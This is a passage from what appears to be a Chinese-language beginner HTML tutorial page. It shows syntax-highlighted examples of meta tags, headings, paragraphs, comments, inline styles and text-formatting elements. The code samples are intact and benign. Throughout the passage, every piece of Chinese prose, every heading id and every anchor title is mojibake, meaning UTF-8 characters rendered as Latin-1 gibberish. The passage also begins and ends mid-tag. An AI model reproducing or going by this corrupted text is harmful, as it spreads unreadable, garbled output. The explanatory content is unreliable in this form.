id="æŒ‡å®š-UTF-8-ç¼–ç "><a href="#æŒ‡å®š-UTF-8-ç¼–ç " class="headerlink" title="æŒ‡å®š UTF-8 ç¼–ç "></a>æŒ‡å®š UTF-8 ç¼–ç </h4><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span></code></pre><h4 id="ç½‘é¡µå°ºå¯¸è‡ªé€‚åº”"><a href="#ç½‘é¡µå°ºå¯¸è‡ªé€‚åº”" class="headerlink" title="ç½‘é¡µå°ºå¯¸è‡ªé€‚åº”"></a>ç½‘é¡µå°ºå¯¸è‡ªé€‚åº”</h4><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span></code></pre><h4 id="ä¸€äº›SEOå…³é”®è¯ä¼˜åŒ–"><a href="#ä¸€äº›SEOå…³é”®è¯ä¼˜åŒ–" class="headerlink" title="ä¸€äº›SEOå…³é”®è¯ä¼˜åŒ–"></a>ä¸€äº›SEOå…³é”®è¯ä¼˜åŒ–</h4><p>å…³é”®è¯ï¼Œæè¿°ï¼Œä½œè€…ç­‰ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>keywords<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>MiaoTony, HTML, test<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>MiaoTony<span class="token punctuation">'</span>s HTML test.<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>author<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>MiaoTony<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span></code></pre><h4 id="è‡ªåŠ¨åˆ·æ–°è·³è½¬é¡µé¢-é‡å®šå‘é¡µé¢"><a href="#è‡ªåŠ¨åˆ·æ–°è·³è½¬é¡µé¢-é‡å®šå‘é¡µé¢" class="headerlink" title="è‡ªåŠ¨åˆ·æ–°è·³è½¬é¡µé¢ / é‡å®šå‘é¡µé¢"></a>è‡ªåŠ¨åˆ·æ–°è·³è½¬é¡µé¢ / é‡å®šå‘é¡µé¢</h4><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>refresh<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0; https://miaotony.xyz<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span></code></pre><p>0såè‡ªåŠ¨è·³è½¬ã€‚</p><br><h2 id="æ ‡é¢˜"><a href="#æ ‡é¢˜" class="headerlink" title="æ ‡é¢˜"></a>æ ‡é¢˜</h2><p>æ ‡é¢˜ï¼ˆHeadingï¼‰æ˜¯é€šè¿‡ <code>&lt;h1&gt;</code> - <code>&lt;h6&gt;</code>å®šä¹‰ï¼Œä»å¤§åˆ°å°ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>This is heading 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>This is heading 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">&gt;</span></span>This is heading 3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h4</span><span class="token punctuation">&gt;</span></span>This is heading 4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h4</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h5</span><span class="token punctuation">&gt;</span></span>This is heading 5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h5</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h6</span><span class="token punctuation">&gt;</span></span>This is heading 6<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h6</span><span class="token punctuation">&gt;</span></span></code></pre><blockquote><p>è¯·ä»…ä»…æŠŠæ ‡é¢˜æ ‡ç­¾ç”¨äºæ ‡é¢˜æ–‡æœ¬ã€‚ä¸è¦ä»…ä»…ä¸ºäº†äº§ç”Ÿç²—ä½“æ–‡æœ¬è€Œä½¿ç”¨å®ƒä»¬ã€‚è¯·ä½¿ç”¨å…¶å®ƒæ ‡ç­¾æˆ– CSS ä»£æ›¿ã€‚</p></blockquote><br><h2 id="æ°´å¹³çº¿"><a href="#æ°´å¹³çº¿" class="headerlink" title="æ°´å¹³çº¿"></a>æ°´å¹³çº¿</h2><p><code>&lt;hr /&gt;</code>æ ‡ç­¾ç”¨äºå®šä¹‰æ°´å¹³çº¿ã€‚å¦‚â†“ã€‚</p><hr><br><h2 id="æ®µè½"><a href="#æ®µè½" class="headerlink" title="æ®µè½"></a>æ®µè½</h2><p> <code>&lt;p&gt;</code> æ ‡ç­¾</p><p>æµè§ˆå™¨ä¼šè‡ªåŠ¨åœ°åœ¨æ®µè½çš„å‰åæ·»åŠ ç©ºè¡Œã€‚ï¼ˆ<code>&lt;p&gt;</code> æ˜¯å—çº§å…ƒç´ ï¼‰</p><p>æ’å…¥ç©ºè¡Œå¯ä»¥åˆ©ç”¨ <code>&lt;br /&gt;</code>ï¼Œä¸è¦ç”¨ <code>p</code> æ ‡ç­¾ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>è¿™æ˜¯æ®µè½<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span></code></pre><p>è¿™æ˜¯æ®µè½</p><hr><p>åœ¨ä¸äº§ç”Ÿä¸€ä¸ªæ–°æ®µè½çš„æƒ…å†µä¸‹è¿›è¡Œæ¢è¡Œï¼ˆæ–°è¡Œï¼‰ï¼Œä½¿ç”¨ <code>&lt;br /&gt;</code>ï¼Œæ¯”å¦‚ï¼š</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>This is<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>a para<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>graph with line breaks<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span></code></pre><p>This is<br>a para<br>graph with line breaks</p>---<p>æ˜¾ç¤ºé¡µé¢æ—¶ï¼Œæµè§ˆå™¨ä¼šç§»é™¤<em>æºä»£ç ä¸­</em>å¤šä½™çš„ç©ºæ ¼å’Œç©ºè¡Œã€‚<strong>æ‰€æœ‰è¿ç»­çš„ç©ºæ ¼æˆ–ç©ºè¡Œéƒ½ä¼šè¢«ç®—ä½œä¸€ä¸ªç©ºæ ¼ã€‚</strong></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<strong>HTML ä»£ç ä¸­çš„æ‰€æœ‰è¿ç»­çš„ç©ºè¡Œï¼ˆæ¢è¡Œï¼‰ä¹Ÿè¢«æ˜¾ç¤ºä¸ºä¸€ä¸ªç©ºæ ¼ã€‚</strong>æ¯”å¦‚ï¼š</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>    æ˜¥çœ ä¸è§‰æ™“ï¼Œ      å¤„å¤„é—»å•¼é¸Ÿã€‚        å¤œæ¥é£é›¨å£°ï¼Œ          èŠ±è½çŸ¥å¤šå°‘ã€‚<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span></code></pre><p>    æ˜¥çœ ä¸è§‰æ™“ï¼Œ      å¤„å¤„é—»å•¼é¸Ÿã€‚        å¤œæ¥é£é›¨å£°ï¼Œ          èŠ±è½çŸ¥å¤šå°‘ã€‚</p><br><h2 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h2><pre class="language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- This is a comment --&gt;</span></code></pre><h3 id="æ¡ä»¶æ³¨é‡Š"><a href="#æ¡ä»¶æ³¨é‡Š" class="headerlink" title="æ¡ä»¶æ³¨é‡Š"></a>æ¡ä»¶æ³¨é‡Š</h3><p>æ¡ä»¶æ³¨é‡Šå®šä¹‰åªæœ‰ Internet Explorer æ‰§è¡Œçš„ HTML æ ‡ç­¾ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!--[if lt IE 9]&gt;  &lt;script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"&gt;&lt;/script&gt;&lt;![endif]--&gt;</span></code></pre><br><h2 id="æ ·å¼"><a href="#æ ·å¼" class="headerlink" title="æ ·å¼"></a>æ ·å¼</h2><p><code>&lt;style&gt;</code> æ ‡ç­¾ç”¨äºä¸º HTML æ–‡æ¡£å®šä¹‰æ ·å¼ä¿¡æ¯ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">font-family</span><span class="token punctuation">:</span>verdana<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>red</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>This text is in Verdana and red<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">font-family</span><span class="token punctuation">:</span>times<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>green</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>This text is in Times and green<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">font-size</span><span class="token punctuation">:</span>30px</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>This text is 30 pixels high<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span></code></pre><p style="font-family:verdana;color:red">This text is in Verdana and red</p><p style="font-family:times;color:green">This text is in Times and green</p><p style="font-size:30px">This text is 30 pixels high</p>ä¸‹é¢æ˜¯ä¸€äº›å®ä¾‹ï¼Œæ›´å¤šå…³äºæ ·å¼çš„éœ€è¦çœ‹ **CSSæ•™ç¨‹** æ¥ç€ï¼ˆï¼ˆ<h3 id="èƒŒæ™¯é¢œè‰²"><a href="#èƒŒæ™¯é¢œè‰²" class="headerlink" title="èƒŒæ™¯é¢œè‰²"></a>èƒŒæ™¯é¢œè‰²</h3><p><em><code>bgcolor</code> å±æ€§å·²ç»å¼ƒç”¨äº†</em>ï¼Œè¦ç”¨<code>background-color</code>ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">background-color</span><span class="token punctuation">:</span>blue</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>This is a paragraph.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span></code></pre><p style="background-color:blue">This is a paragraph.</p>  <br><h3 id="å­—ä½“ã€é¢œè‰²å’Œå°ºå¯¸"><a href="#å­—ä½“ã€é¢œè‰²å’Œå°ºå¯¸" class="headerlink" title="å­—ä½“ã€é¢œè‰²å’Œå°ºå¯¸"></a>å­—ä½“ã€é¢œè‰²å’Œå°ºå¯¸</h3><p>style å±æ€§æ·˜æ±°äº†æ—§çš„ <code>&lt;font&gt;</code> æ ‡ç­¾ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">font-family</span><span class="token punctuation">:</span>arial<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>red<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span>25px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>A paragraph.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span></code></pre><p style="font-family:arial;color:red;font-size:25px;">A paragraph.</p><br><h3 id="æ–‡æœ¬å¯¹é½"><a href="#æ–‡æœ¬å¯¹é½" class="headerlink" title="æ–‡æœ¬å¯¹é½"></a>æ–‡æœ¬å¯¹é½</h3><p>ä½¿ç”¨<code>text-align</code>å±æ€§</p><p>style å±æ€§æ·˜æ±°äº†æ—§çš„ <code>align</code> å±æ€§ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">text-align</span><span class="token punctuation">:</span>left</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>é å·¦å¯¹é½<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">text-align</span><span class="token punctuation">:</span>center</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>å±…ä¸­å¯¹é½<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">text-align</span><span class="token punctuation">:</span>right</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>é å³å¯¹é½<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span></code></pre><p style="text-align:left">é å·¦å¯¹é½</p><p style="text-align:center">å±…ä¸­å¯¹é½</p><p style="text-align:right">é å³å¯¹é½</p><br><h2 id="æ–‡æœ¬æ ¼å¼åŒ–"><a href="#æ–‡æœ¬æ ¼å¼åŒ–" class="headerlink" title="æ–‡æœ¬æ ¼å¼åŒ–"></a>æ–‡æœ¬æ ¼å¼åŒ–</h2><p><strong>å®šä¹‰å¾ˆå¤šä¾›æ ¼å¼åŒ–è¾“å‡ºçš„å…ƒç´ ï¼Œæ¯”å¦‚ç²—ä½“å’Œæ–œä½“å­—ã€‚</strong></p><h3 id="æ ¼å¼åŒ–"><a href="#æ ¼å¼åŒ–" class="headerlink" title="æ ¼å¼åŒ–"></a>æ ¼å¼åŒ–</h3><p>å»ºè®®ç”¨<code>strong</code>ã€<code>em</code>è¿™ç±»<strong>åŸºäºå†…å®¹çš„æ ·å¼</strong>ï¼ˆcontent-based styleï¼‰æ¥ä»£æ›¿<code>b</code>ã€<code>i</code>è¿™ç±»<strong>ç‰©ç†æ ·å¼</strong>ï¼ˆphysical styleï¼‰ï¼Œæ›´èƒ½è¯­ä¹‰åŒ–ã€‚</p><p>è¯¦è§è¿™é‡Œï¼š<a href="https://www.w3school.com.cn/html/html_style.asp">HTML æ•™ç¨‹å»¶ä¼¸é˜…è¯»ï¼šæ”¹å˜æ–‡æœ¬çš„å¤–è§‚å’Œå«ä¹‰</a></p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">&gt;</span></span>This text is bold<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">&gt;</span></span>This text is strong<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>big</span><span class="token punctuation">&gt;</span></span>This text is big<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>big</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>em</span><span class="token punctuation">&gt;</span></span>This text is emphasized<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>em</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span><span class="token punctuation">&gt;</span></span>This text is italic<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>small</span><span class="token punctuation">&gt;</span></span>This text is small<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>small</span><span class="token punctuation">&gt;</span></span>This text contains<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sub</span><span class="token punctuation">&gt;</span></span>subscriptä¸‹æ ‡<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sub</span><span class="token punctuation">&gt;</span></span>This text contains<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sup</span><span class="token punctuation">&gt;</span></span>superscriptä¸Šæ ‡<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sup</span><span class="token punctuation">&gt;</span></span></code></pre><p><b>This text is bold</b></p><p><strong>This text is strong</strong></p><p><big>This text is big</big></p><p><em>This text is emphasized</em></p><p><i>This text is italic</i></p><p><small>This text is small</small></p><p>This text contains<sub>subscriptä¸‹æ ‡</sub></p><p>This text contains<sup>superscriptä¸Šæ ‡</sup></p><hr><h3 id="é¢„æ ¼å¼æ–‡æœ¬"><a href="#é¢„æ ¼å¼æ–‡æœ¬" class="headerlink" title="é¢„æ ¼å¼æ–‡æœ¬"></a>é¢„æ ¼å¼æ–‡æœ¬</h3><p><code>&lt;pre&gt;</code>æ ‡ç­¾</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">&gt;</span></span>è¿™æ˜¯é¢„æ ¼å¼æ–‡æœ¬ã€‚å®ƒä¿ç•™äº†      ç©ºæ ¼å’Œæ¢è¡Œã€‚<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">&gt;</span></span>for i in range(1,10):     print(i)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">&gt;</span></span></code></pre><pre>è¿™æ˜¯é¢„æ ¼å¼æ–‡æœ¬ã€‚å®ƒä¿ç•™äº†      ç©ºæ ¼å’Œæ¢è¡Œã€‚</pre><p><code>pre</code> æ ‡ç­¾å¾ˆé€‚åˆæ˜¾ç¤ºè®¡ç®—æœºä»£ç ï¼šï¼ˆå¯ä»¥å…ˆç”¨<code>pre</code>å†ç”¨<code>code</code>æ ‡ç­¾</p><pre>for i in range(1,10):     print(i)</pre><hr><h3 id="è®¡ç®—æœº-ç¼–ç¨‹ä»£ç "><a href="#è®¡ç®—æœº-ç¼–ç¨‹ä»£ç " class="headerlink" title="è®¡ç®—æœº/ç¼–ç¨‹ä»£ç "></a>è®¡ç®—æœº/ç¼–ç¨‹ä»£ç </h3><p>è¿™äº›æ ‡ç­¾å¸¸ç”¨äºæ˜¾ç¤ºè®¡ç®—æœº/ç¼–ç¨‹ä»£ç â†“ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">&gt;</span></span>Computer code<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>kbd</span><span class="token punctuation">&gt;</span></span>Keyboard input<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>kbd</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tt</span><span class="token punctuation">&gt;</span></span>Teletype text<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tt</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>samp</span><span class="token punctuation">&gt;</span></span>Sample text<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>samp</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>var</span><span class="token punctuation">&gt;</span></span>Computer variable<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>var</span><span class="token punctuation">&gt;</span></span></code></pre><p><code>Computer code</code></p><p><kbd>Keyboard input</kbd></p><p><tt>Teletype text</tt></p><p><samp>Sample text</samp></p><p><var>Computer variable</var></p><hr><h3 id="åœ°å€"><a href="#åœ°å€" class="headerlink" title="åœ°å€"></a>åœ°å€</h3><p>address</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>address</span><span class="token punctuation">&gt;</span></span>Written by <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://miaotony.xyz<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>MiaoTony<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span> Visit me at:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>miaotony.xyz<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/&gt;</span></span>MeowBox<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>address</span><span class="token punctuation">&gt;</span></span></code></pre><address>Written by <a href="https://miaotony.xyz">MiaoTony</a>.<br> Visit me at:<br>miaotony.xyz<br>MeowBox</address><hr><h3 id="ç¼©å†™å’Œé¦–å­—æ¯ç¼©å†™"><a href="#ç¼©å†™å’Œé¦–å­—æ¯ç¼©å†™" class="headerlink" title="ç¼©å†™å’Œé¦–å­—æ¯ç¼©å†™"></a>ç¼©å†™å’Œé¦–å­—æ¯ç¼©å†™</h3><p>åœ¨æŸäº›æµè§ˆå™¨ä¸­ï¼Œå½“æŠŠé¼ æ ‡ç§»è‡³ç¼©ç•¥è¯è¯­ä¸Šæ—¶ï¼Œtitle å¯ç”¨äºå±•ç¤ºè¡¨è¾¾çš„å®Œæ•´ç‰ˆæœ¬ã€‚</p><p><code>&lt;abbr&gt;</code>å®šä¹‰ç¼©å†™ï¼Œ<code>&lt;acronym&gt;</code> å®šä¹‰é¦–å­—æ¯ç¼©å†™ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>abbr</span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>etcetera<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>etc.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>abbr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>acronym</span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>World Wide Web<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>WWW<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>acronym</span><span class="token punctuation">&gt;</span></span></code></pre><p><abbr title="etcetera">etc.</abbr><br><acronym title="World Wide Web">WWW</acronym></p><hr><h3 id="æ–‡å­—æ–¹å‘ï¼ˆåŒå‘é‡å†™ï¼‰"><a href="#æ–‡å­—æ–¹å‘ï¼ˆåŒå‘é‡å†™ï¼‰" class="headerlink" title="æ–‡å­—æ–¹å‘ï¼ˆåŒå‘é‡å†™ï¼‰"></a>æ–‡å­—æ–¹å‘ï¼ˆåŒå‘é‡å†™ï¼‰</h3><p>è‹¥æµè§ˆå™¨æ”¯æŒåŒæµå‘è¦†ç›– bi-directional override (bdo)ï¼Œ<code>&lt;bdo&gt;</code>å…ƒç´ ç”¨äºè¦†ç›–å½“å‰æ–‡æœ¬æ–¹å‘ï¼Œåˆ™ä¸‹é¢è¿™ä¸€è¡Œä¼šä»å³å‘å·¦è¾“å‡º (rtl)ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bdo</span> <span class="token attr-name">dir</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>rtl<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Here is some Hebrew text<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bdo</span><span class="token punctuation">&gt;</span></span></code></pre><bdo dir="rtl">Here is some Hebrew text</bdo><hr><h3 id="å¼•ç”¨"><a href="#å¼•ç”¨" class="headerlink" title="å¼•ç”¨"></a>å¼•ç”¨</h3><p>ä½¿ç”¨ blockquote å…ƒç´ çš„è¯ï¼Œæµè§ˆå™¨ä¼šæ’å…¥æ¢è¡Œå’Œå¤–è¾¹è·ï¼Œè€Œ q å…ƒç´ ä¸ä¼šæœ‰ä»»ä½•ç‰¹æ®Šçš„å‘ˆç°ï¼ˆåªæ˜¯åŠ ä¸€ä¸ªå¼•å·ï¼‰ã€‚</p><pre class="language-html" data-language="html"><code class="language-html">è¿™æ˜¯é•¿çš„å¼•ç”¨ï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>blockquote</span><span class="token punctuation">&gt;</span></span>è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚<span class="token tag"><span class="token tag"><span 